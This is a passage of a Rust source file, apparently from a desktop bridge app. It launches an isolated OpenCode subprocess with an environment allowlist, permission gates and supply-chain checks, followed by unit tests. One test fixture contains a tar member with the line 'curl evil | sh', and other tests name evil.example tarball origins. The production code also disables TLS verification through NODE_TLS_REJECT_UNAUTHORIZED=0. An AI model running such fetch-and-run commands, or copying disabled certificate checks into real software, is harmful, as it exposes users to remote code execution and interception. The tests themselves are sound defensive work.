                    "apiKey": key,
                },
                "models": Value::Object(models),
            }),
        );
        configured.push(provider.id.to_string());
    }
    (Value::Object(section), configured)
}

/// `startBackend` 使用的环境变量白名单：其余（尤其其他 provider 的 Key 与
/// OpenCode 登录态）一律不得透传给子进程。
pub const ENV_ALLOW: &[&str] = &[
    "PATH",
    "HOME",
    "USER",
    "LANG",
    "TMPDIR",
    "SHELL",
    "SSL_CERT_FILE",
    "NODE_EXTRA_CA_CERTS",
    "SystemRoot",
    "WINDIR",
    "TEMP",
    "TMP",
    "USERPROFILE",
    "APPDATA",
    "LOCALAPPDATA",
    "PATHEXT",
    "COMSPEC",
];

/// `ENV_ALLOW` 白名单过滤：宿主环境里只有这些变量名能进子进程，空值一律丢弃。
/// 每一次 spawn（包括 `--version` 探测这类一次性调用）都必须先经过这里，
/// 否则 `run_command` 会在未 `env_clear` 的分支上把宿主完整环境透传出去。
pub fn allowed_environment(host_env: &Env) -> Env {
    let mut env: Env = HashMap::new();
    for key in ENV_ALLOW {
        if let Some(value) = host_env.get(*key).filter(|value| !value.is_empty()) {
            env.insert((*key).to_string(), value.clone());
        }
    }
    env
}

/// 组装子进程环境（白名单 + XDG 隔离 + 代理 + OPENCODE_* 覆盖）。
pub fn isolated_environment(
    root: &str,
    proxy_env: &Env,
    password: &str,
    host_env: &Env,
    providers_section: Value,
) -> Env {
    let mut env: Env = allowed_environment(host_env);
    for name in ["config", "data", "cache", "state"] {
        env.insert(
            format!("XDG_{}_HOME", name.to_uppercase()),
            join_host(&[root, name]),
        );
    }
    for (key, value) in proxy_env {
        env.insert(key.clone(), value.clone());
    }
    env.insert("OPENCODE_SERVER_PASSWORD".to_string(), password.to_string());
    env.insert("OPENCODE_SERVER_USERNAME".to_string(), "opencode".to_string());
    for flag in [
        "OPENCODE_DISABLE_AUTOUPDATE",
        "OPENCODE_DISABLE_PROJECT_CONFIG",
        "OPENCODE_DISABLE_CLAUDE_CODE",
        "OPENCODE_DISABLE_EXTERNAL_SKILLS",
    ] {
        env.insert(flag.to_string(), "true".to_string());
    }
    env.insert(
        "OPENCODE_CONFIG_CONTENT".to_string(),
        js_stringify(&isolated_config(providers_section)),
    );
    // Bun 运行时在向上游模型 API 和 models.opencode.ai 发 HTTPS 请求时，
    // 若用户网络存在 TLS 拦截（公司代理/VPN/ZScaler 等），会因不信任拦截
    // 证书而报 "self signed certificate"。Bun 不读取 macOS 系统钥匙串，
    // 所以即使拦截证书已安装到系统钥匙串也无济于事。这里关闭 TLS 验证
    // 让探测和对话能正常工作；wbBridge 本身的 HTTP API 在 127.0.0.1
    // 上不受影响。
    env.insert("NODE_TLS_REJECT_UNAUTHORIZED".to_string(), "0".to_string());
    env
}

/// `randomBytes(24).toString('hex')` 的等价物：48 个 hex 字符，UUIDv4 组合生成。
pub fn generate_password() -> String {
    let raw = format!("{}{}", Uuid::new_v4().as_simple(), Uuid::new_v4().as_simple());
    raw.chars().take(48).collect()
}

type ChildSlot = Arc<Mutex<Option<tokio::process::Child>>>;

fn lock_child(slot: &ChildSlot) -> std::sync::MutexGuard<'_, Option<tokio::process::Child>> {
    match slot.lock() {
        Ok(guard) => guard,
        Err(poisoned) => poisoned.into_inner(),
    }
}

/// SIGTERM → 4s 宽限 → SIGKILL（对应 JS `stop()`；Windows 下与 Node 一致直接终止）。
pub async fn stop_backend(backend: &Backend, child_slot: &ChildSlot) {
    backend.stop_events();
    let pid = {
        let mut guard = lock_child(child_slot);
        let Some(child) = guard.as_mut() else { return };
        match child.try_wait() {
            Ok(Some(_)) => {
                *guard = None;
                return;
            }
            _ => child.id(),
        }
    };
    let Some(pid) = pid else { return };
    #[cfg(unix)]
    {
        let raw = pid as i32;
        unsafe { libc::kill(raw, libc::SIGTERM) };
        let deadline = Instant::now() + Duration::from_secs(4);
        loop {
            let exited = {
                let mut guard = lock_child(child_slot);
                if guard
                    .as_mut()
                    .is_some_and(|child| child.try_wait().ok().flatten().is_some())
                {
                    *guard = None;
                    true
                } else {
                    false
                }
            };
            if exited || Instant::now() >= deadline {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        let still_alive = lock_child(child_slot).as_mut().is_some_and(|child| {
            child.try_wait().ok().flatten().is_none()
        });
        if still_alive {
            unsafe { libc::kill(raw, libc::SIGKILL) };
        }
    }
    #[cfg(not(unix))]
    {
        let _ = pid;
        let mut guard = lock_child(child_slot);
        if let Some(child) = guard.as_mut() {
            let _ = child.start_kill();
        }
    }
}

/// `startBackend` 的返回：已就绪的 Backend + 关停钩子 + 运行时版本。
pub struct Started {
    pub backend: Backend,
    pub version: String,
    child_slot: ChildSlot,
}

impl Started {
    /// JS 返回的 `stop()`。
    pub async fn stop(&self) {
        stop_backend(&self.backend, &self.child_slot).await;
    }

    /// 子进程句柄槽位（供编排层实现 `child.on('exit')` 式的退出监听）。
    ///
    /// 只允许 `try_wait` 之类的非阻塞观察：回收与发信号始终归 `stop_backend`，
    /// 否则 watcher 会把进程变成僵尸或与其竞争 SIGTERM/SIGKILL 时序。
    pub fn child_slot(&self) -> Arc<Mutex<Option<tokio::process::Child>>> {
        Arc::clone(&self.child_slot)
    }
}

/// `startBackend(binary, dataDir, logStream, proxyEnv)`。
///
/// `log_file` 必须以 append 方式打开：子进程 stdout/stderr 与 Backend 日志共享同一文件。
pub async fn start_backend(
    binary: &str,
    data_dir: &str,
    log_file: fs::File,
    proxy_env: &Env,
) -> Result<Started, String> {
    // 版本回读同样只带白名单环境：这一步跑的是刚下载/刚发现的二进制。
    let host_env = std::env::vars().collect::<Env>();
    let probe_env = allowed_environment(&host_env);
    let actual_version = probe_version(binary, || {
        run_command(
            binary,
            &["--version"],
            None,
            Some(&probe_env),
            VERSION_PROBE_TIMEOUT,
        )
    })
    .await?;
    let root = join_host(&[data_dir, "opencode"]);
    for name in ["config", "data", "cache", "state", "project"] {
        let dir = join_host(&[&root, name]);
        fs::create_dir_all(&dir).map_err(|error| error.to_string())?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            // 隔离目录里会有 OPENCODE_SERVER_PASSWORD 与配置副本，0700 是隔离红线的一部分：
            // chmod 失败必须失败退出，不能留下一个组/其他用户可读的「隔离」目录。
            fs::set_permissions(&dir, fs::Permissions::from_mode(0o700))
                .map_err(|error| format!("Failed to protect isolated OpenCode directory {dir}: {error}"))?;
        }
    }
    let password = generate_password();
    // 多平台接入：启动时读一次已配置的平台 Key 并构造声明段。Key 只经
    // OPENCODE_CONFIG_CONTENT 进子进程（见 isolated_config 的凭据纪律）；
    // Key 变更后需重启核心才会重新读取（最小改动，不做热重载）。
    let (providers_section, _configured) = providers_section_for(data_dir);
    let env = isolated_environment(&root, proxy_env, &password, &host_env, providers_section);
    let project = join_host(&[&root, "project"]);

    // 启动常驻服务前先刷新目录，避免首份目录快照落在内嵌的过期版本上。
    run_command(
        binary,
        &["models", "opencode", "--refresh", "--pure"],
        Some(&project),
        Some(&env),
        Duration::from_secs(45),
    )
    .await?;

    // 随机空闲回环端口（与 JS 的 net.createServer().listen(0) 等价）。
    let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0))
        .await
        .map_err(|error| error.to_string())?;
    let port = listener.local_addr().map_err(|error| error.to_string())?.port();
    drop(listener);

    let mut command = Command::new(binary);
    command
        .args([
            "serve",
            "--pure",
            "--hostname",
            "127.0.0.1",
            "--port",
            &port.to_string(),
        ])
        .current_dir(&project)
        .env_clear() // 红线：白名单之外绝不透传任何环境变量
        .stdin(Stdio::null())
        .kill_on_drop(true);
    for (key, value) in &env {
        command.env(key, value);
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        command.creation_flags(0x0800_0000);
    }
    // append 模式下 dup 句柄共享文件偏移，两路输出并写即 JS 的 pipe 语义。
    let stdout_file = log_file.try_clone().map_err(|error| error.to_string())?;
    let stderr_file = log_file.try_clone().map_err(|error| error.to_string())?;
    command
        .stdout(Stdio::from(stdout_file))
        .stderr(Stdio::from(stderr_file));
    let child = command.spawn().map_err(|error| error.to_string())?;
    let child_slot: ChildSlot = Arc::new(Mutex::new(Some(child)));

    let backend_file = Arc::new(Mutex::new(log_file));
    let backend_log = backend_file.clone();
    let backend = Backend::new(
        format!("http://127.0.0.1:{port}"),
        password.clone(),
        move |message: &str| {
            let mut guard = match backend_log.lock() {
                Ok(guard) => guard,
                Err(poisoned) => poisoned.into_inner(),
            };
            let _ = writeln!(guard, "{} {message}", now_iso());
        },
    );

    let outcome: Result<String, String> = async {
        for _ in 0..120 {
            let exited = {
                let mut guard = lock_child(&child_slot);
                guard
                    .as_mut()
                    .and_then(|child| child.try_wait().ok().flatten().map(|status| status.code().unwrap_or(-1)))
            };
            if let Some(code) = exited {
                return Err(format!("OpenCode exited: {code}"));
            }
            if let Ok(health) = backend
                .request("/global/health", "GET", None, None, Some(Duration::from_secs(1)))
                .await
            {
                if health.get("healthy") == Some(&json!(true)) {
                    if health.get("version") != Some(&json!(actual_version.as_str())) {
                        return Err("Unexpected OpenCode server version".to_string());
                    }
                    return Ok(health
                        .get("version")
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string());
                }
            }
            tokio::time::sleep(Duration::from_millis(500)).await;
        }
        Err("OpenCode startup timed out".to_string())
    }
    .await;

    match outcome {
        Ok(version) => Ok(Started {
            backend,
            version,
            child_slot,
        }),
        Err(error) => {
            stop_backend(&backend, &child_slot).await;
            Err(error)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 供应链红线：安装只取出 `package/bin/<binary>` 这一个成员。tarball 里的其他条目
    /// （同包脚本、同目录的第二个二进制）必须一个字节都不落盘，否则"只取单个文件"退化成整包解压。
    #[test]
    fn extraction_only_takes_the_requested_tar_member() {
        let dir = std::env::temp_dir().join(format!(
            "wbbridge-tar-{}-{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("临时目录可建");
        let archive = dir.join("pkg.tgz");
        let out_file = dir.join("opencode");

        {
            let file = std::fs::File::create(&archive).expect("归档可建");
            let mut builder =
                tar::Builder::new(flate2::write::GzEncoder::new(file, flate2::Compression::default()));
            let members: [(&str, &[u8]); 4] = [
                ("package/install.sh", b"#!/bin/sh\ncurl evil | sh\n".as_slice()),
                ("package/bin/helper", b"#!/bin/sh\necho helper\n".as_slice()),
                ("package/bin/opencode", b"#!/bin/sh\necho ok\n".as_slice()),
                ("package/docs/readme.md", b"docs\n".as_slice()),
            ];
            for (name, body) in members {
                let mut header = tar::Header::new_gnu();
                header.set_path(name).expect("成员路径可写");
                header.set_size(body.len() as u64);
                header.set_mode(0o755);
                header.set_entry_type(tar::EntryType::Regular);
                header.set_cksum();
                builder.append(&header, body).expect("成员可写入归档");
            }
            builder.finish().expect("归档可收尾");
        }

        extract_runtime_member(
            archive.to_str().expect("临时路径是 utf-8"),
            "package/bin/opencode",
            out_file.to_str().expect("临时路径是 utf-8"),
        )
        .expect("目标成员必须取出");
        assert_eq!(std::fs::read(&out_file).expect("目标成员可读"), b"#!/bin/sh\necho ok\n");

        // 目录里只剩归档本身与目标文件：其余成员从未被写出。
        let mut names: Vec<String> = std::fs::read_dir(&dir)
            .expect("临时目录可读")
            .filter_map(|entry| entry.ok())
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .collect();
        names.sort();
        assert_eq!(names, vec!["opencode".to_string(), "pkg.tgz".to_string()]);

        // 目标成员缺失时必须报错，而不是回退去取别的成员。
        let missing = extract_runtime_member(
            archive.to_str().expect("临时路径是 utf-8"),
            "package/bin/other",
            dir.join("other").to_str().expect("临时路径是 utf-8"),
        );
        assert!(missing.is_err(), "缺失成员必须失败");
        assert!(!dir.join("other").exists());

        let _ = std::fs::remove_dir_all(&dir);
    }

    fn env_of(pairs: &[(&str, &str)]) -> Env {
        pairs
            .iter()
            .map(|(key, value)| (key.to_string(), value.to_string()))
            .collect()
    }

    #[test]
    fn version_compare_and_pattern_follow_node() {
        assert!(is_version("1.18.32"));
        assert!(is_version("1.18.32-beta.1"));
        assert!(is_version("1.18.32+build.9"));
        assert!(!is_version("not-a-version"));
        assert!(!is_version("1.18"));
        assert!(compare_versions("1.18.32", "1.25.7") < 0);
        assert_eq!(compare_versions("1.25.7", "1.25.7"), 0);
        assert!(compare_versions("1.25.8", "1.25.7") > 0);
        // 预发布后缀不参与比较（与 JS split(/[+-]/, 1) 一致）。
        assert_eq!(compare_versions("1.25.7-beta", "1.25.7"), 0);
    }

    #[tokio::test]
    async fn a_stalled_version_probe_is_retried_once_and_can_succeed() {
        let mut calls = 0;
        let version = probe_version("/managed/opencode", || {
            calls += 1;
            let first = calls == 1;
            async move {
                if first {
                    Err("/managed/opencode timed out".to_string())
                } else {
                    Ok("1.18.35".to_string())
                }
            }
        })
        .await
        .expect("第二次返回就必须成功");
        assert_eq!(version, "1.18.35");
        assert_eq!(calls, 2);
    }

    #[tokio::test]
    async fn a_failing_version_probe_is_not_retried_and_keeps_its_error() {
        let mut calls = 0;
        let error = probe_version("/managed/opencode", || {
            calls += 1;
            async move { Err("/managed/opencode exited with code 1".to_string()) }
        })
        .await
        .expect_err("退出码非 0 是二进制本身的问题");
        assert_eq!(calls, 1, "非超时失败重试只会把启动耗时整整翻倍");
        assert_eq!(error, "/managed/opencode exited with code 1");
    }

    #[tokio::test]
    async fn two_stalled_attempts_explain_the_stall_without_a_timeout_only_budget() {
        let mut calls = 0;
        let error = probe_version("/managed/opencode", || {
            calls += 1;
            async move { Err("/managed/opencode timed out".to_string()) }
        })
        .await
        .expect_err("两次都超时才报错");
        assert_eq!(calls, VERSION_PROBE_ATTEMPTS);
        // 迁移前 JS 的那句逐字保留在最前，下游按它匹配。
        assert!(error.starts_with("/managed/opencode timed out"), "{error}");
        assert!(error.contains("不是密钥或配置的问题"), "{error}");
        // 主路径是「等一等再点重试」：本工具正常出网不需要代理，代理只是用户环境确实要代理时的选项。
        let retry_at = error
            .find("状态条上的「重试」")
            .expect("必须给出重试入口");
        let proxy_at = error.find("使用系统代理").expect("必须提到代理开关");
        assert!(
            retry_at < proxy_at && error.contains("本工具正常情况不需要代理"),
            "代理不能被说成唯一入口：{error}"
        );
        assert!(
            !error.contains("只有侧栏") && !error.contains("唯一"),
            "不得把系统代理说成唯一可操作入口：{error}"
        );
    }

    #[test]
    fn launcher_script_pattern_matches_js() {
        for name in ["opencode.cmd", "OpenCode.BAT", "run.ps1"] {
            assert!(launcher_regex().is_match(name), "{name}");
        }
        assert!(!launcher_regex().is_match("opencode.exe"));
        assert!(!launcher_regex().is_match("opencode"));
    }

    #[test]
    fn runtime_candidates_lists_env_override_then_install_locations() {
        let pkg = runtime_package("darwin", "arm64").unwrap();
        let candidates = runtime_candidates(&pkg, "darwin", &env_of(&[]), "/Users/test");
        assert_eq!(
            candidates,
            vec![
                "/Users/test/.opencode/bin/opencode",
                "/opt/homebrew/bin/opencode",
                "/usr/local/bin/opencode",
            ]
        );
        let with_env = runtime_candidates(
            &pkg,
            "darwin",
            &env_of(&[("BUDDY_OPENCODE_PATH", "/custom/opencode")]),
            "/Users/test",
        );
        assert_eq!(with_env[0], "/custom/opencode");

        let win = runtime_package("win32", "x64").unwrap();
        let windows_candidates = runtime_candidates(
            &win,
            "win32",
            &env_of(&[("APPDATA", "C:\\Users\\t\\AppData\\Roaming")]),
            "C:\\Users\\t",
        );
        assert_eq!(
            windows_candidates,
            vec![
                "C:\\Users\\t\\.opencode\\bin\\opencode.exe",
                "C:\\Users\\t\\AppData\\Roaming\\npm\\node_modules\\opencode-ai\\bin\\opencode.exe",
            ]
        );
    }

    #[test]
    fn isolated_config_keeps_every_permission_gate() {
        let config = isolated_config(Value::Null);
        assert_eq!(config["permission"]["*"], json!("ask"));
        assert_eq!(config["permission"]["task"], json!("deny"));
        assert_eq!(config["autoupdate"], json!(false));
        assert_eq!(config["share"], json!("disabled"));
        assert_eq!(config["agent"]["buddy-chat"]["mode"], json!("primary"));
        assert_eq!(config["agent"]["buddy-bridge"]["mode"], json!("primary"));
        assert_eq!(
            config["agent"]["buddy-chat"]["permission"]["*"],
            json!("ask")
        );
    }

    /// 多平台接入：声明段只认对象输入；空段时 provider 键整段不出现，与接入前逐字节一致；
    /// 非空段整体挂到 config["provider"] 下，不触碰权限表与自定义 agent。
    #[test]
    fn isolated_config_treats_empty_section_as_absent_provider_block() {
        let empty = isolated_config(Value::Null);
        assert!(empty.get("provider").is_none(), "空段不得出现 provider 键");

        let json_input = isolated_config(json!({}));
        assert!(json_input.get("provider").is_none(), "空对象同样视为空段");

        let section = json!({
            "zhipuai": { "npm": "@ai-sdk/openai-compatible", "options": { "baseURL": "https://x", "apiKey": "k" } }
        });
        let with = isolated_config(section);
        assert_eq!(with["provider"]["zhipuai"]["npm"], json!("@ai-sdk/openai-compatible"));
        assert_eq!(with["provider"]["zhipuai"]["options"]["baseURL"], json!("https://x"));
        assert_eq!(with["provider"]["zhipuai"]["options"]["apiKey"], json!("k"));
        // 权限与 agent 不受注入影响。
        assert_eq!(with["permission"]["*"], json!("ask"));
        assert_eq!(with["agent"]["buddy-bridge"]["mode"], json!("primary"));
    }

    /// providers_section_for：只收注册表内已配置平台；未配置/注册表外整段不出现。
    #[test]
    fn providers_section_for_lists_only_configured_registered_platforms() {
        let dir = std::env::temp_dir().join(format!("wbbridge-section-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("临时目录");
        let data_dir = dir.to_string_lossy().to_string();

        // 空目录：没有任何平台配置。
        let (section, configured) = providers_section_for(&data_dir);
        assert_eq!(section, json!({}));
        assert!(configured.is_empty());

        // 配置两家（含首尾空白裁剪语义），另一家写注册表外的残留键。
        crate::providers::set_key(&data_dir, "modelscope", " ms-key ").expect("写入 modelscope");
        crate::providers::set_key(&data_dir, "zhipuai", "glm-key").expect("写入 zhipuai");
        let (section, configured) = providers_section_for(&data_dir);
        assert_eq!(configured, vec!["modelscope".to_string(), "zhipuai".to_string()]);
        assert_eq!(section["modelscope"]["npm"], json!("@ai-sdk/openai-compatible"));
        assert_eq!(section["modelscope"]["options"]["baseURL"], json!("https://api-inference.modelscope.cn/v1"));
        assert_eq!(section["modelscope"]["options"]["apiKey"], json!("ms-key"), "必须复用 check_key 的裁剪结果");
        // 有权威清单的平台：models 段逐条声明清单里的模型（锚点不出现，因为非空段本身就
        // 满足「声明段生效」的前提）。
        let served = crate::providers::served_models("modelscope");
        assert!(
            !served.is_empty(),
            "ModelScope 必须有权威清单，否则注入段退回锚点、catalog 的过期 id 又会进探测队列"
        );
        let declared = section["modelscope"]["models"].as_object().expect("models 段是对象");
        assert_eq!(declared.len(), served.len(), "注入条目数必须与清单一致：{declared:?}");
        for model in served {
            assert_eq!(
                declared.get(model.id),
                Some(&json!({
                    "name": model.name,
                    "limit": { "context": model.context, "output": model.output },
                    "cost": { "input": 0, "output": 0 },
                    "tool_call": model.tool_call,
                })),
                "每条声明必须逐项等于清单内容：{}",
                model.id
            );
        }
        assert!(
            !declared.contains_key(ANCHOR_MODEL_KEY),
            "有权威清单时不需要锚点占位"
        );
        // 无权威清单的平台：非空且只含锚点条目（缺 models 键 → ai-sdk 报 has no provider supported；
        // 空对象 → catalog 合并被清空、发现 0 模型；锚点幽灵由 free_models_in 过滤）。
        assert_eq!(section["zhipuai"]["options"]["apiKey"], json!("glm-key"));
        assert_eq!(section["zhipuai"]["models"], json!({ ANCHOR_MODEL_KEY: {} }));
        assert!(section.get("siliconflow-cn").is_none(), "未配置平台整段不出现");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn isolated_environment_never_leaks_unlisted_variables() {
        let host = env_of(&[
            ("PATH", "/usr/bin"),
            ("HOME", "/Users/test"),
            ("OPENAI_API_KEY", "sk-secret"),
            ("OPENCODE_AUTH_TOKEN", "token"),
            ("EMPTY_ONE", ""),
        ]);
        let proxy = env_of(&[("HTTPS_PROXY", "http://127.0.0.1:7890")]);
        let env = isolated_environment("/data/opencode", &proxy, "pw", &host, Value::Null);
        assert_eq!(env.get("PATH").map(String::as_str), Some("/usr/bin"));
        assert_eq!(env.get("HOME").map(String::as_str), Some("/Users/test"));
        assert_eq!(env.get("HTTPS_PROXY").map(String::as_str), Some("http://127.0.0.1:7890"));
        assert!(!env.contains_key("OPENAI_API_KEY"), "provider key must not pass through");
        assert!(!env.contains_key("OPENCODE_AUTH_TOKEN"));
        assert!(!env.contains_key("EMPTY_ONE"));
        assert_eq!(env.get("XDG_CONFIG_HOME").map(String::as_str), Some("/data/opencode/config"));
        assert_eq!(env.get("OPENCODE_SERVER_PASSWORD").map(String::as_str), Some("pw"));
        assert_eq!(env.get("OPENCODE_DISABLE_AUTOUPDATE").map(String::as_str), Some("true"));
        let config: Value = serde_json::from_str(env.get("OPENCODE_CONFIG_CONTENT").unwrap()).unwrap();
        assert_eq!(config["permission"]["*"], json!("ask"));
    }

    #[test]
    fn generated_password_matches_node_length_and_hex_charset() {
        let password = generate_password();
        assert_eq!(password.len(), 48);
        assert!(password.chars().all(|c| c.is_ascii_hexdigit()));
        assert_ne!(generate_password(), generate_password());
    }

    #[test]
    fn now_iso_shape_matches_json_stringify() {
        let text = now_iso();
        assert!(is_match_iso(&text), "got {text}");
    }

    fn is_match_iso(text: &str) -> bool {
        Regex::new(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$")
            .unwrap()
            .is_match(text)
    }

    #[test]
    fn valid_metadata_enforces_the_supply_chain_gates() {
        let pkg = runtime_package("darwin", "arm64").unwrap();
        let registries = vec![
            "https://registry.npmjs.org".to_string(),
            "https://registry.npmmirror.com".to_string(),
        ];
        let good = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
            "dist": { "integrity": "sha512-abc", "tarball": "https://registry.npmjs.org/opencode-darwin-arm64/-/opencode-darwin-arm64-1.25.7.tgz" } });
        assert!(valid_metadata(&good, &pkg, &registries));

        let external = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
            "dist": { "integrity": "sha512-abc", "tarball": "https://example.com/runtime.tgz" } });
        assert!(!valid_metadata(&external, &pkg, &registries));

        // 路径形状完全合规、只有 origin 在站外：这是 origin 校验唯一能挡住的情形，
        // 而 integrity 与 tarball 出自同一份元数据，sha512 在此不提供真实性。
        let shaped_external = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
            "dist": { "integrity": "sha512-abc", "tarball": "https://evil.example.com/opencode-darwin-arm64/-/opencode-darwin-arm64-1.25.7.tgz" } });
        assert!(!valid_metadata(&shaped_external, &pkg, &registries), "站外 origin 必须拒绝");

        // userinfo 伪装成白名单主机（真实 host 是 evil.example）：按 origin 判定，不得放过。
        let userinfo_spoof = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
            "dist": { "integrity": "sha512-abc", "tarball": "https://registry.npmjs.org@evil.example/opencode-darwin-arm64/-/x.tgz" } });
        assert!(!valid_metadata(&userinfo_spoof, &pkg, &registries), "userinfo 伪装必须拒绝");

        // 白名单内的国内镜像同形状 tarball 仍须可用，别让修复变成只允许官方源。
        let mirrored = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
            "dist": { "integrity": "sha512-abc", "tarball": "https://registry.npmmirror.com/opencode-darwin-arm64/-/opencode-darwin-arm64-1.25.7.tgz" } });
        assert!(valid_metadata(&mirrored, &pkg, &registries), "白名单镜像必须放行");

        let weak = json!({ "name": "opencode-darwin-arm64", "version": "1.25.7",
            "dist": { "integrity": "sha256-abc", "tarball": "https://registry.npmjs.org/opencode-darwin-arm64/-/x.tgz" } });
        assert!(!valid_metadata(&weak, &pkg, &registries));

        let renamed = json!({ "name": "evil-package", "version": "1.25.7",
            "dist": { "integrity": "sha512-abc", "tarball": "https://registry.npmjs.org/opencode-darwin-arm64/-/x.tgz" } });
        assert!(!valid_metadata(&renamed, &pkg, &registries));

        let bad_version = json!({ "name": "opencode-darwin-arm64", "version": "nightly",
            "dist": { "integrity": "sha512-abc", "tarball": "https://registry.npmjs.org/opencode-darwin-arm64/-/x.tgz" } });
        assert!(!valid_metadata(&bad_version, &pkg, &registries));
    }

    fn make_archive(binary: &str, content: &str) -> Vec<u8> {
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut builder = tar::Builder::new(encoder);
        let mut header = tar::Header::new_gnu();
        header.set_size(content.len() as u64);
        header.set_mode(0o755);
        header.set_entry_type(tar::EntryType::Regular);
        header.set_cksum();
        builder
            .append_data(&mut header, format!("package/bin/{binary}"), content.as_bytes())
            .unwrap();
        let encoder = builder.into_inner().unwrap();
        encoder.finish().unwrap()
    }

    fn sha512_integrity(bytes: &[u8]) -> String {
        let mut hasher = Sha512::new();
        hasher.update(bytes);
        format!("sha512-{}", BASE64.encode(hasher.finalize()))
    }

    /// synthetic 运行时：版本探测直接读文件内容（对应 JS 测试的 fixture probe）。
    fn synthetic_probe() -> Arc<ProbeFn> {
        Arc::new(|file: String| {
            Box::pin(async move {
                fs::read_to_string(&file)
                    .map(|text| text.trim().to_string())
                    .map_err(|error| error.to_string())
            })
        })
    }

    fn temp_dir(name: &str) -> String {
        let base = std::env::temp_dir().join(format!(
            "wbbridge-runtime-{name}-{}",
            Uuid::new_v4().simple()
        ));
        fs::create_dir_all(&base).unwrap();
        base.to_string_lossy().to_string()
    }

    fn write_binary(file: &str, version: &str) {
        fs::create_dir_all(parent_dir(file)).unwrap();
        fs::write(file, format!("{version}\n")).unwrap();
    }

    struct MockFetch {
        calls: Mutex<Vec<String>>,
        responses: HashMap<String, Result<Vec<u8>, String>>,
        default: Result<Vec<u8>, String>,
        proxied: Mutex<Vec<bool>>,
    }

    fn mock_options(fetch: Arc<MockFetch>) -> Arc<FetchFn> {
        Arc::new(move |url: String, args: FetchArgs| {
            let fetch = fetch.clone();
            Box::pin(async move {
                fetch.calls.lock().unwrap().push(url.clone());
                fetch.proxied.lock().unwrap().push(args.proxy.is_some());
                let body = match fetch.responses.get(&url) {
                    Some(Ok(body)) => Ok(body.clone()),
                    Some(Err(error)) => Err(error.clone()),
                    None => fetch.default.clone().map_err(|_| "Should not contact npm".to_string()),
                }?;
                Ok(FetchReply { status: 200, body })
            })
        })
    }

    fn metadata_json(pkg: &RuntimePackage, version: &str, tarball: &str, integrity: &str) -> Vec<u8> {
        json!({ "name": pkg.name, "version": version,
            "dist": { "integrity": integrity, "tarball": tarball } })
        .to_string()
        .into_bytes()
    }

    async fn find(data_dir: &str, options: RuntimeOptions) -> Result<String, String> {
        find_runtime(data_dir, Arc::new(|_| {}), options).await
    }

    #[tokio::test]
    async fn reuses_local_runtimes_when_official_latest_cannot_be_checked() {
        let root = temp_dir("reuse");
        let pkg = runtime_package(host_platform(), host_arch()).unwrap();
        let mut options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![]),
            ..Default::default()
        };
        options.fetch = Some(Arc::new(|_, _| Box::pin(async { Err("Should not contact npm".to_string()) })));
        let old = join_host(&[&root, "managed", "runtime", "1.18.32", &pkg.binary]);
        write_binary(&old, "1.18.32");
        let found = find(&join_host(&[&root, "managed"]), options).await.unwrap();
        assert_eq!(found, old);

        // 候选二进制会被复制进托管目录并按版本落位。
        let newer = join_host(&[&root, "source", &pkg.binary]);
        write_binary(&newer, "1.25.7");
        let options2 = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![newer.clone()]),
            fetch: Some(Arc::new(|_, _| Box::pin(async { Err("Should not contact npm".to_string()) }))),
            ..Default::default()
        };
        let copied = find(&join_host(&[&root, "fresh"]), options2).await.unwrap();
        assert_eq!(copied, join_host(&[&root, "fresh", "runtime", "1.25.7", &pkg.binary]));
        assert_eq!(fs::read_to_string(&copied).unwrap(), fs::read_to_string(&newer).unwrap());
        let _ = fs::remove_dir_all(&root);
    }

    #[tokio::test]
    async fn reuses_local_runtime_when_not_older_than_official_latest() {
        let root = temp_dir("current");
        let pkg = runtime_package(host_platform(), host_arch()).unwrap();
        let current = join_host(&[&root, "source", &pkg.binary]);
        write_binary(&current, "1.25.7");
        let latest_url = format!("https://registry.npmjs.org/{}/latest", pkg.name);
        let responses = HashMap::from([(
            latest_url.clone(),
            Ok(metadata_json(&pkg, "1.25.7", &format!("https://registry.npmjs.org/{}/-/{}-1.25.7.tgz", pkg.name, pkg.name), "sha512-placeholder")),
        )]);
        let fetch_state = Arc::new(MockFetch {
            calls: Mutex::new(Vec::new()),
            responses,
            default: Err("Should not contact npm".to_string()),
            proxied: Mutex::new(Vec::new()),
        });
        let options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![current]),
            fetch: Some(mock_options(fetch_state.clone())),
            ..Default::default()
        };
        let copied = find(&join_host(&[&root, "managed"]), options).await.unwrap();
        assert_eq!(copied, join_host(&[&root, "managed", "runtime", "1.25.7", &pkg.binary]));
        assert_eq!(*fetch_state.calls.lock().unwrap(), vec![latest_url]);
        let _ = fs::remove_dir_all(&root);
    }

    #[tokio::test]
    async fn downloads_official_latest_when_local_runtime_is_stale() {
        let root = temp_dir("download");
        let pkg = runtime_package(host_platform(), host_arch()).unwrap();
        let binary_name = pkg.binary.clone();
        let stale = join_host(&[&root, "source", &pkg.binary]);
        write_binary(&stale, "1.17.8");
        let archive_bytes = make_archive(&binary_name, "1.18.33\n");
        let bytes_for_integrity = archive_bytes.clone();
        let integrity = sha512_integrity(&bytes_for_integrity);
        let url = format!("https://registry.npmjs.org/{}/-/{}-1.18.33.tgz", pkg.name, pkg.name);
        let latest_url = format!("https://registry.npmjs.org/{}/latest", pkg.name);
        let responses = HashMap::from([
            (latest_url.clone(), Ok(metadata_json(&pkg, "1.18.33", &url, &integrity))),
